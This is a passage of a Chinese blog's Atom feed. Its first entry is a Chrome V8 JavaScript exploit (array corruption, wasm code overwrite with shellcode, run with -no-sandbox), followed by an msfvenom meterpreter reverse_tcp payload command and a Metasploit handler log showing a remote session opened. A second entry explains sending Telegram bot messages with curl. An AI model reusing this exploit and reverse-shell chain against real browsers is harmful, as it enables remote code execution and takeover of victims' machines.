0xb33f;      &#125;  &#125;   function foo(a) &#123;       let x = -1;       if (a) x = 0xFFFFFFFF;       var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));       arr.shift();       let local_arr = Array(2);       local_arr[0] = 5.1;//4014666666666666       let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8       arr[0] = 0x1122;       return [arr, local_arr, buff];  &#125;   for (var i = 0; i &lt; 0x10000; ++i)       foo(false);   gc(); gc();  [corrput_arr, rwarr, corrupt_buff] = foo(true);   corrput_arr[12] = 0x22444;   delete corrput_arr;   function setbackingStore(hi, low) &#123;       rwarr[4] = i2f(fLow(rwarr[4]), hi);       rwarr[5] = i2f(low, fHi(rwarr[5]));  &#125;   function leakObjLow(o) &#123;       corrupt_buff.slot = o;       return (fLow(rwarr[9]) - 1);  &#125;   let corrupt_view = new DataView(corrupt_buff);   let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);   let idx0Addr = corrupt_buffer_ptr_low - 0x10;   let baseAddr = (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;   let delta = baseAddr + 0x1c - idx0Addr;   if ((delta % 8) == 0) &#123;       let baseIdx = delta / 8;       this.base = fLow(rwarr[baseIdx]);  &#125; else &#123;       let baseIdx = ((delta - (delta % 8)) / 8);       this.base = fHi(rwarr[baseIdx]);  &#125;   let wasmInsAddr = leakObjLow(wasmInstance);   setbackingStore(wasmInsAddr, this.base);   let code_entry = corrupt_view.getFloat64(13 * 8, true);   setbackingStore(fLow(code_entry), fHi(code_entry));   for (let i = 0; i &lt; shellcode.length; i++) &#123;       corrupt_view.setUint8(i, shellcode[i]);  &#125;   main();&lt;/script&gt;</code></pre><p>MSF</p><pre><code class="zsh">msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.26 lport=8080 -f csharp &gt; bb.txt</code></pre><p><img src="../images/chrome.jpg" alt="cs-payload"></p><pre><code class="zsh">python -m SimpleHTTPServer 8888/path/to/chrome.exe -no-sandbox </code></pre><p>msf运行</p><pre><code class="zsh">msf6 &gt; handler -H 192.168.43.26 -P 8080 -p windows/x64/meterpreter/reverse_tcp[*] Payload handler running as background job 0.[*] Started reverse TCP handler on 192.168.43.26:8080msf6 &gt; [*] Sending stage (200262 bytes) to 192.168.43.26[*] Meterpreter session 1 opened (192.168.43.26:8080 -&gt; 192.168.43.26:54937) at 2021-04-16 08:52:41 +0800msf6 &gt;msf6 &gt; jobsJobs====  Id  Name                    Payload                              Payload opts  --  ----                    -------                              ------------  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://192.168.43.26:8080msf6 &gt; sessionsActive sessions===============  Id  Name  Type                     Information                              Connection  --  ----  ----                     -----------                              ----------  1         meterpreter x64/windows  ETHANHUNTER78BC\ethan @ ETHANHUNTER78BC  192.168.43.26:8080 -&gt; 192.168.43.26:54937 (10.211.55.3)msf6 &gt; sessions -i 1[*] Starting interaction with 1...meterpreter &gt;</code></pre><p>参考：<br><a href="https://mp.weixin.qq.com/s/LOpAu8vs8ob85W3sCmXMew">Cobalt Strike 利用 Chrome 0day 上线 </a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;exp-html-sample&quot;&gt;&lt;a href=&quot;#exp-html-sample&quot; class=&quot;h</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Telegram</title>
    <link href="https://askding.github.io/Tools/Telegram.html"/>
    <id>https://askding.github.io/Tools/Telegram.html</id>
    <published>2021-04-09T04:42:22.000Z</published>
    <updated>2021-04-09T04:42:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>Telegram（非正式簡稱TG）是跨平台的即時通訊软件</p><h2 id="如何通过电报机器人给自己发消息-类似微信公众号推送消息通知"><a href="#如何通过电报机器人给自己发消息-类似微信公众号推送消息通知" class="headerlink" title="如何通过电报机器人给自己发消息(类似微信公众号推送消息通知)"></a>如何通过电报机器人给自己发消息(类似微信公众号推送消息通知)</h2><pre><code class="zsh">curl -X POST &quot;https://api.telegram.org/bot&lt;token&gt;/sendMessage&quot; -d &quot;chat_id=&lt;chat-id&gt;5&amp;text=&lt;message&gt;&quot;</code></pre><p>所需参数</p><ul><li><p><em><token></em>  机器人token 类似于 1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo</p></li><li><p><em><chat-id></em> 会话id 类似于 509654615</p></li><li><p><em><message></em> 推送内容</p></li><li><p><input disabled="" type="checkbox">  创建Telegram机器人 获取Token (任意聊天窗口发送@BotFather，并点击此字符串即可)</p><pre><code class="zsh">/start/newbot &lt;bot_name&gt;         //机器人名字&lt;user_name&gt;_bot    //机器人ID  输入完毕后返回此机器人的Token 《1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo》Done! Congratulations on your new bot. You will find it at t.me/Bili_auto_checkIn_bot. You can now add a description, about section and profile picture for your bot, see /help for a list of commands. By the way, when you&#39;ve finished creating your cool bot, ping our Bot Support if you want a better username for it. Just make sure the bot is fully operational before you do this.  Use this token to access the HTTP API:  1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo  Keep your token secure and store it safely, it can be used by anyone to control your bot.  For a description of the Bot API, see this page: https://core.telegram.org/bots/api</code></pre></li><li><p><input disabled="" type="checkbox">  获取会话id (任意聊天窗口发送@userinfo，并点击此字符串)</p><pre><code class="zsh">    @ethan1Id: 509654615  First: Ethan  Last: Hunter  Lang: en</code></pre></li><li><p><input disabled="" type="checkbox">  curl测试推送内容到机器人</p><pre><code class="zsh">curl -X POST &quot;https://api.telegram.org/bot173220123420:AAGRfRacMKAtFHtM1XSpj477mMFRSONKlPWo/sendMessage&quot; -d &quot;chat_id=509654615&amp;text=https://askding.github.io&quot;&#123;  &quot;ok&quot;: true,   &quot;result&quot;: &#123;      &quot;message_id&quot;: 11,       &quot;from&quot;: &#123;          &quot;id&quot;: 17020603330,           &quot;is_bot&quot;: true,           &quot;first_name&quot;: &quot;Bili&quot;,           &quot;username&quot;: &quot;Bili_checkIn_bot&quot;      &#125;,       &quot;chat&quot;: &#123;          &quot;id&quot;: 5096546232,           &quot;first_name&quot;: &quot;Ethan&quot;,           &quot;last_name&quot;: &quot;Hunter&quot;,           &quot;username&quot;: &quot;et7an&quot;,           &quot;type&quot;: &quot;private&quot;      &#125;,       &quot;date&quot;: 1617958429,       &quot;text&quot;: &quot;https://askding.github.io&quot;,       &quot;entities&quot;: [          &#123;              &quot;offset&quot;: 0,               &quot;length&quot;: 25,               &quot;type&quot;: &quot;url&quot;          &#125;      ]  &#125;&#125;</code></pre></li></ul><p>参考<br><a href="https://zhuanlan.zhihu.com/p/146062288">如何通过电报机器人给自己或群组发消息</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Telegram（非正式簡稱TG）是跨平台的即時通訊软件&lt;/p&gt;
&lt;h2 id=&quot;如何通过电报机器人给自己发消息-</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
</feed>
